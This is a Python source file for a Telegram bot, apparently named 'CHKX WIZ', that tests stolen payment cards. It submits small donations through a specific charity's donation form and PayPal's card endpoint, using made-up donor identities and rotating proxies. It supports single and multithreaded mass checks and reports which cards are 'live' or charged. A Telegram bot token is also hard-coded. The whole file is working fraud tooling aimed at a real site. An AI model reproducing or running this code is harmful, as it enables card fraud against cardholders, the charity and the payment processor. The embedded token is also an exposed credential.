from flask import Flask, request, jsonify
import requests
import re
import time
import telebot
import random
import threading
import queue
from telebot import types
import os
import sys

app = Flask(__name__)

# Listas de nomes
nomes = ["Liam", "Noah", "Oliver", "Elijah", "James", "William", "Benjamin", "Lucas", "Henry", 
         "Alexander", "Michael", "Daniel", "Matthew", "Joseph", "David", "Samuel", "John", "Ethan",
         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden",
         "Gabriel", "Carter", "Luke", "Grayson", "Isaac", "Lincoln", "Mason", "Theodore", "Ryan",
         "Nathan", "Andrew", "Joshua", "Thomas", "Charles", "Caleb", "Christian", "Hunter", "Jonathan",
         "Eli", "Aaron", "Connor", "Isaiah", "Jaxon", "Nicholas", "Adrian", "Cameron", "Jordan",
         "Brayden", "Dominic", "Austin", "Ian", "Adam", "Elias", "Jose", "Anthony", "Colton", "Chase",
         "Jason", "Zachary", "Xavier", "Christopher", "Jace", "Cooper", "Kevin", "Nolan", "Parker",
         "Miles", "Asher", "Ryder", "Roman", "Evan", "Greyson", "Josiah", "Axel", "Wesley", "Leonardo",
         "Santiago", "Kayden", "Brandon", "Everett", "Rowan", "Micah", "Vincent", "Tyler", "Maximus",
         "Amir", "Kingston", "Justin", "Silas", "Declan", "Luca", "Carlos", "Max", "Diego", "Damian",
         "Harrison", "Brantley", "Brody", "George", "Maverick", "Braxton", "Jonah", "Timothy", "Jude"]

apelidos = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
            "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Thompson",
            "White", "Lee", "Perez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young", "Allen",
            "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson",
            "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Gomez", "Phillips",
            "Evans", "Turner", "Diaz", "Parker", "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris",
            "Morales", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson",
            "Bailey", "Reed", "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson", "Watson",
            "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes", "Price",
            "Alvarez", "Castillo", "Sanders", "Patel", "Myers", "Long", "Ross", "Foster", "Jimenez",
            "Powell", "Jenkins", "Perry", "Russell", "Sullivan", "Bell", "Coleman", "Butler", "Henderson",
            "Barnes", "Gonzales", "Fisher", "Vasquez", "Simmons", "Romero", "Jordan", "Patterson", "Alexander"]

# Pega o token do ambiente (Render Secret)
TOKEN = os.environ.get('BOT_TOKEN', '8248894438:AAH4B0Vkr0gxZOwaiD9q2lfllbspGnbS04o')
bot = telebot.TeleBot(TOKEN, threaded=False)

# Configuração de threads
max_threads = 15

# Lista de proxies
proxies_list = []
current_proxy_index = 0
proxy_lock = threading.Lock()
request_counter = 0
request_lock = threading.Lock()

# Webhook URL (vai ser configurada)
WEBHOOK_URL = None

def parse_proxy(proxy_string):
    """Parse diferentes formatos de proxy HTTP"""
    proxy_string = proxy_string.strip()
    
    if proxy_string.startswith('http://'):
        return proxy_string
    
    if '@' in proxy_string and ':' in proxy_string.split('@')[0]:
        return f'http://{proxy_string}'
    
    if ':' in proxy_string and not '@' in proxy_string:
        parts = proxy_string.split(':')
        if len(parts) == 2:
            return f'http://{proxy_string}'
    
    if proxy_string.startswith('http://') and '@' not in proxy_string:
        return proxy_string
    
    return None

def test_proxy(proxy_url):
    """Testa se um proxy está funcionando"""
    try:
        proxies = {'http': proxy_url, 'https': proxy_url}
        response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
        return response.status_code == 200
    except:
        return False

def get_next_proxy():
    """Retorna o próximo proxy da lista de forma round-robin a cada 5 requisições"""
    global current_proxy_index, request_counter
    
    with proxy_lock:
        if not proxies_list:
            return None
        
        with request_lock:
            request_counter += 1
            if request_counter >= 5:
                request_counter = 0
                current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
        
        proxy = proxies_list[current_proxy_index]
        return {'http': proxy, 'https': proxy}

def get_session_with_proxy():
    """Cria uma sessão com proxy configurado"""
    session = requests.Session()
    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)
    return session

@bot.message_handler(commands=['addproxies'])
def add_proxies(message):
    global proxies_list
    
    if not message.reply_to_message:
        bot.reply_to(message, "❌ <b>Please reply to a message containing the proxy list</b>", parse_mode="HTML")
        return
    
    proxy_text = message.reply_to_message.text
    lines = proxy_text.strip().split('\n')
    
    added = 0
    invalid = 0
    
    for line in lines:
        parsed = parse_proxy(line)
        if parsed:
            proxies_list.append(parsed)
            added += 1
        else:
            invalid += 1
    
    if added > 0:
        bot.reply_to(message, f"✅ <b>Added {added} proxies! (Invalid: {invalid})\nTotal proxies: {len(proxies_list)}</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"❌ <b>No valid proxies found! (Invalid: {invalid})</b>", parse_mode="HTML")

@bot.message_handler(commands=['testp'])
def test_proxies(message):
    global proxies_list
    
    if not proxies_list:
        bot.reply_to(message, "❌ <b>No proxies in the list! Use /addproxies first</b>", parse_mode="HTML")
        return
    
    init_msg = bot.reply_to(message, f"🔍 <b>Testing {len(proxies_list)} proxies...</b>", parse_mode="HTML")
    
    working_proxies = []
    failed_proxies = []
    
    total = len(proxies_list)
    tested = 0
    
    for proxy in proxies_list:
        tested += 1
        try:
            if tested % 5 == 0 or tested == total:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=init_msg.message_id,
                    text=f"🔍 <b>Testing proxies... ({tested}/{total})</b>",
                    parse_mode="HTML"
                )
            
            if test_proxy(proxy):
                working_proxies.append(proxy)
            else:
                failed_proxies.append(proxy)
        except:
            failed_proxies.append(proxy)
    
    proxies_list = working_proxies
    
    result_text = f'''<b>📊 Proxy Test Results:
━━━━━━━━━━━━━━━━━━━━
✅ Working: {len(working_proxies)}
❌ Failed: {len(failed_proxies)}
📝 Total tested: {total}
━━━━━━━━━━━━━━━━━━━━
💾 Kept {len(working_proxies)} working proxies</b>'''
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=init_msg.message_id,
        text=result_text,
        parse_mode="HTML"
    )

@bot.message_handler(commands=['viewproxies'])
def view_proxies(message):
    if not proxies_list:
        bot.reply_to(message, "❌ <b>No proxies in the list! Use /addproxies first</b>", parse_mode="HTML")
        return
    
    proxy_preview = "\n".join(proxies_list[:10])
    if len(proxies_list) > 10:
        proxy_preview += f"\n... and {len(proxies_list) - 10} more"
    
    result_text = f'''<b>📋 Proxy List:
━━━━━━━━━━━━━━━━━━━━
📝 Total: {len(proxies_list)}
🔄 Rotation: Every 5 requests

━━━ Active Proxies ━━━
{proxy_preview}</b>'''
    
    bot.reply_to(message, result_text, parse_mode="HTML")

@bot.message_handler(commands=['delproxies'])
def delete_proxies(message):
    global proxies_list, current_proxy_index, request_counter
    
    count = len(proxies_list)
    proxies_list = []
    current_proxy_index = 0
    request_counter = 0
    
    bot.reply_to(message, f"🗑️ <b>Deleted {count} proxies from the list!</b>", parse_mode="HTML")

def reg(card_details):
    pattern = r'(\d{16}\|\d{1,2}\|\d{2,4}\|\d{3})'
    match = re.search(pattern, card_details)
    return match.group(1) if match else 'None'

def get_bin_info(bin_number):
    try:
        session = get_session_with_proxy()
        data = session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=3).json()
        return data
    except:
        return {}

def format_year(yy):
    yy = str(yy).strip()
    if len(yy) == 2:
        return f"20{yy}"
    elif len(yy) == 4:
        return yy
    else:
        return yy

def brn6(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    
    if len(parts) != 4:
        return f"DECLINED ❌|Invalid card format"
    
    cc = parts[0]
    mm = parts[1]
    yy_raw = parts[2]
    cvv = parts[3]
    yy = format_year(yy_raw)
    
    session = get_session_with_proxy()
    
    codigos_postais_ny_manhattan = [
        '10001', '10002', '10003', '10004', '10005', '10006', '10007', '10009', '10010',
        '10011', '10012', '10013', '10014', '10016', '10017', '10018', '10019', '10021',
        '10022', '10023', '10024', '10025', '10026', '10027', '10028', '10029', '10031',
        '10032', '10033', '10034', '10035'
    ]
    
    try:
        nome = random.choice(nomes)
        apelido = random.choice(apelidos)
        postal = random.choice(codigos_postais_ny_manhattan)
        numero = f"201{random.randint(0, 9999999):07d}"
        email = f"{nome.lower()}{apelido.lower()}{random.randint(10,999)}@gmail.com"
        
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        session.get('https://solefamily.org/donate/', cookies=session.cookies, headers=headers)
        
        params = {'giveDonationFormInIframe': '1'}
        res = session.get('https://solefamily.org/give/23178', params=params, cookies=session.cookies, headers=headers).text
        
        hash1 = re.search('form-hash" value="(.*?)"', res).group(1)
        
        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '23178-1'),
            'give-form-id': (None, '23178'),
            'give-form-title': (None, 'Donation Form'),
            'give-current-url': (None, 'https://solefamily.org/donate/'),
            'give-form-url': (None, 'https://solefamily.org/give/23178/'),
            'give-form-minimum': (None, '100'),
            'give-form-maximum': (None, '1000000000'),
            'give-form-hash': (None, hash1),
            'give-price-id': (None, '0'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '10'),
            'give_first': (None, nome),
            'give_last': (None, apelido),
            'give_email': (None, email),
            'payment-mode': (None, 'paypal-commerce'),
            'give_action': (None, 'purchase'),
            'give-gateway': (None, 'paypal-commerce'),
            'give_embed_form': (None, '1'),
            'action': (None, 'give_process_donation'),
            'give_ajax': (None, 'true'),
        }
        
        session.post('https://solefamily.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, files=files)
        time.sleep(1)
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = session.post(
            'https://solefamily.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=session.cookies,
            headers=headers,
            files=files,
        )
        
        id_value = response.json()['data']['id']
        time.sleep(3)
        
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': id_value,
                'card': {
                    'cardNumber': cc,
                    'type': 'VISA',
                    'expirationDate': f'{mm}/{yy}',
                    'postalCode': postal,
                    'securityCode': cvv,
                },
                'phoneNumber': numero,
                'firstName': nome,
                'lastName': apelido,
                'billingAddress': {
                    'givenName': nome,
                    'familyName': apelido,
                    'state': 'NY',
                    'country': 'US',
                    'line1': '47W 13th street ',
                    'city': 'New York ',
                    'postalCode': postal,
                },
                'shippingAddress': {
                    'givenName': nome,
                    'familyName': apelido,
                    'state': 'NY',
                    'country': 'US',
                    'line1': '47W 13th street ',
                    'city': 'New York ',
                    'postalCode': postal,
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }
        
        response = session.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            cookies=session.cookies,
            headers=headers,
            json=json_data,
        )
        
        last = response.text
        
        if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            return 'CHARGE 2$ ✅|Charged successfully'
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return 'Approve ❎|3DS Required'
        elif 'INVALID_SECURITY_CODE' in last:
            return 'APPROVED CCN ✅|INVALID_SECURITY_CODE'
        elif 'INVALID_BILLING_ADDRESS' in last:
            return 'APPROVED - AVS ✅|INVALID_BILLING_ADDRESS'
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return 'APPROVED ✅|EXISTING_ACCOUNT_RESTRICTED'
        else:
            try:
                response_json = response.json()
                if 'errors' in response_json and len(response_json['errors']) > 0:
                    message = response_json['errors'][0].get('message', 'Unknown error')
                    if 'data' in response_json['errors'][0] and len(response_json['errors'][0]['data']) > 0:
                        code = response_json['errors'][0]['data'][0].get('code', 'NO_CODE')
                        return f'DECLINED ❌|{code}'
                    return f'DECLINED ❌|{message}'
                return f'DECLINED ❌|{response.text[:100] if hasattr(response, "text") else "Unknown error"}'
            except:
                return f'DECLINED ❌|{response.text[:100] if hasattr(response, "text") else "Unknown error"}'
                
    except requests.exceptions.Timeout:
        return "DECLINED ❌|Request timeout"
    except Exception as e:
        return f"DECLINED ❌|{str(e)}"

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    menu_text = f'''<b>𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ] 
    
🤖 <u>Available Commands:</u>

🔄 <b>Single Check</b>
→ /pp [card] - Check single card
→ Reply to a card with /pp

📁 <b>Mass Check</b>  
→ /mpp [cards] - Check multiple cards
→ Reply to cards list with /mpp

🌐 <b>Proxy Management</b>
→ /addproxies - Add proxies (reply to proxy list)
→ /viewproxies - View active proxies
→ /delproxies - Delete all proxies
→ /testp - Test and keep only working proxies

⚡ <b>Thread Configuration</b>
→ /thread [1-15] - Set threads for mass check
→ Current threads: {max_threads}

📊 <b>Status</b>
→ /status - Check bot status

🔧 <b>Developer</b>
→ @Lorde_Pc

💬 <b>Support</b>
→ Contact for queries</b>'''
    
    bot.reply_to(message, menu_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def check_status(message):
    status_text = f'''<b>𝘾 𝙃 𝙆 𝕏 [ 𝙎 𝙏 𝘼 𝙏 𝙐 𝙎 ]

⚡ <u>Bot Status:</u>

✅ <b>Bot:</b> Online & Running
🔁 <b>Threads:</b> {max_threads}
🌐 <b>Proxies:</b> {len(proxies_list)}
🔄 <b>Proxy Rotation:</b> Every 5 requests
🔄 <b>Gateway:</b> PayPal 10$
📊 <b>Version:</b> 2.0
👨‍💻 <b>Developer:</b> @Lorde_Pc
🕒 <b>Uptime:</b> Active</b>'''
    
    bot.reply_to(message, status_text, parse_mode="HTML")

@bot.message_handler(commands=['thread'])
def set_threads(message):
    global max_threads
    try:
        args = message.text.split()
        if len(args) > 1:
            new_threads = int(args[1])
            if 1 <= new_threads <= 15:
                max_threads = new_threads
                bot.reply_to(message, f"✅ <b>Threads updated to: {max_threads}</b>", parse_mode="HTML")
            else:
                bot.reply_to(message, "❌ <b>Please enter a number between 1 and 15</b>", parse_mode="HTML")
        else:
            bot.reply_to(message, f"📊 <b>Current threads: {max_threads}\nUse: /thread [1-15]</b>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "❌ <b>Invalid number format</b>", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def respond_to_pp(message):
    gate = '𝙋𝙖𝙮𝙥𝙖𝙡 𝟭0$'
    ko = bot.reply_to(message, "🔍 <b>Checking Your Card...</b>", parse_mode="HTML")
    
    ko_message_id = ko.message_id if isinstance(ko, types.Message) else ko
    
    cc = message.reply_to_message.text if message.reply_to_message else message.text
    cc = str(reg(cc))
    
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko_message_id, 
                             text='''<b>❌ Invalid Format!
Please use: /pp [card]
Format: 5598880399683715|12|2026|602</b>''', parse_mode="HTML")
        return

    start_time = time.time()
    result = brn6(cc)
    
    if "|" in result:
        last, response_message = result.split("|", 1)
    else:
        last = result
        response_message = result
    
    bin_info = get_bin_info(cc[:6])
    brand = bin_info.get('brand', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', '🇺🇸')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    user_name = message.from_user.first_name or "User"
    if message.from_user.last_name:
        user_name += f" {message.from_user.last_name}"
    
    if 'CHARGE 2$ ✅' in last:
        status_main = "Charged 🔥"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'Approve ❎' in last:
        status_main = "3DS Required"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'APPROVED CCN ✅' in last:
        status_main = "CCN Live"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'APPROVED - AVS ✅' in last:
        status_main = "AVS Live"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'APPROVED ✅' in last:
        status_main = "Approved"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    elif 'DECLINED ❌' in last:
        status_main = "Declined"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    else:
        status_main = "Unknown"
        status_line = f"𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:\n✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {last} / {status_main}"
    
    msg = f'''{status_line}

⊀ 𝐂𝐚𝐫𝐝
⤷ {cc}
⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {gate}
⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ {response_message}
𝐁𝐫𝐚𝐧𝐝 ➵ {brand}
𝐁𝐚𝐧𝐤 ➵ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {country} {country_flag}
⌬ 𝐔𝐬𝐞𝐫 ➵ {user_name}
⌥ 𝐃𝐄𝐕 ➵ @Lorde_Pc
⌬ 𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {execution_time:.2f}s'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko_message_id, text=msg, parse_mode="HTML")

def process_card_worker(card_queue, results_queue, gate, chat_id):
    while True:
        try:
            card = card_queue.get_nowait()
        except queue.Empty:
            break
        
        start_time = time.time()
        result = brn6(card)
        
        if "|" in result:
            last, response_message = result.split("|", 1)
        else:
            last = result
            response_message = result
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        bin_info = get_bin_info(card[:6])
        brand = bin_info.get('brand', 'Unknown')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country_name', 'Unknown')
        country_flag = bin_info.get('country_flag', '🇺🇸')
        
        if '✅' in last or '❎' in last:
            status_type = last
        else:
            status_type = last
        
        msg = f'''𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ]:
✗ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_type} / {response_message}

⊀ 𝐂𝐚𝐫𝐝
⤷ {card}
⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {gate}
⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ {response_message}
𝐁𝐫𝐚𝐧𝐝 ➵ {brand}
𝐁𝐚𝐧𝐤 ➵ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {country} {country_flag}
⌬ 𝐔𝐬𝐞𝐫 ➵ Mass Check
⌥ 𝐃𝐄𝐕 ➵ @Lorde_Pc
⌬ 𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {execution_time:.2f}s'''
        
        try:
            bot.send_message(chat_id=chat_id, text=msg, parse_mode="HTML")
        except:
            pass
        
        results_queue.put((last, card))
        card_queue.task_done()

@bot.message_handler(commands=['mpp'])
def mass_check(message):
    gate = '𝙋𝙖𝙮𝙥𝙖𝙡 𝟭0$'
    chat_id = message.chat.id
    init_msg = bot.reply_to(message, "<b>⚡ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙...</b>", parse_mode="HTML")
    
    if message.reply_to_message:
        cc_text = message.reply_to_message.text
    else:
        cc_text = message.text.replace('/mpp', '').strip()
    
    pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
    cc_list = re.findall(pattern, cc_text)
    
    if not cc_list:
        bot.edit_message_text(chat_id=chat_id, message_id=init_msg.message_id, 
                            text='''<b>❌ No valid cards found!
Format: 5598880399683715|12|2026|602</b>''', parse_mode="HTML")
        return
    
    total_cards = len(cc_list)
    
    card_queue = queue.Queue()
    results_queue = queue.Queue()
    
    for cc in cc_list:
        card_queue.put(cc)
    
    threads = []
    for i in range(min(max_threads, total_cards)):
        thread = threading.Thread(
            target=process_card_worker,
            args=(card_queue, results_queue, gate, chat_id)
        )
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    processed = 0
    approved = 0
    declined = 0
    
    while processed < total_cards:
        time.sleep(0.5)
        processed = total_cards - card_queue.qsize()
        
        temp_approved = 0
        temp_declined = 0
        temp_results = []
        while not results_queue.empty():
            result, card = results_queue.get()
            if '✅' in result or '❎' in result:
                temp_approved += 1
            else:
                temp_declined += 1
            temp_results.append((result, card))
        
        for result, card in temp_results:
            results_queue.put((result, card))
        
        approved = temp_approved
        declined = temp_declined
        
        progress_text = f'''<b>⚡ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨...

🗂️ 𝐓𝐨𝐭𝐚𝐥: {total_cards}
✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}
📊 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {processed}/{total_cards}
🧵 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {max_threads}</b>'''
        
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=init_msg.message_id,
                text=progress_text,
                parse_mode="HTML"
            )
        except:
            pass
    
    for thread in threads:
        thread.join(timeout=10)
    
    final_approved = 0
    final_declined = 0
    
    while not results_queue.empty():
        result, card = results_queue.get()
        if '✅' in result or '❎' in result:
            final_approved += 1
        else:
            final_declined += 1
    
    final_msg = f'''<b>📊 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 ✅
━━━━━━━━━━━━━━━━━━━━
🗂️ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: {total_cards}
✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {final_approved}
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {final_declined}
━━━━━━━━━━━━━━━━━━━━
🔁 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gate}
🧵 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {max_threads}
👨‍💻 𝐃𝐞𝐯: @Lorde_Pc</b>'''
    
    bot.edit_message_text(chat_id=chat_id, message_id=init_msg.message_id, text=final_msg, parse_mode="HTML")

# Rota do webhook do Telegram
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Invalid Content-Type', 403

# Rota de health check (necessário para o Render)
@app.route('/')
def index():
    return 'Bot is running!', 200

# Função para iniciar o bot com webhook
def setup_webhook():
    global WEBHOOK_URL
    
    # Pega a URL do Render (definida como variável de ambiente)
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    
    if render_url:
        WEBHOOK_URL = f"{render_url}/webhook/{TOKEN}"
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=WEBHOOK_URL)
        print(f"✅ Webhook set to: {WEBHOOK_URL}")
    else:
        print("⚠️ RENDER_EXTERNAL_URL not set, falling back to polling...")
        # Fallback para polling se não tiver webhook configurado
        threading.Thread(target=bot.polling, kwargs={'none_stop': True}).start()

if __name__ == '__main__':
    print("𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ] - Bot Started Successfully ✅")
    print(f"Threads configured: {max_threads}")
    print("Proxy rotation: Every 5 requests")
    
    # Configura webhook
    setup_webhook()
    
    # Inicia o servidor Flask
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
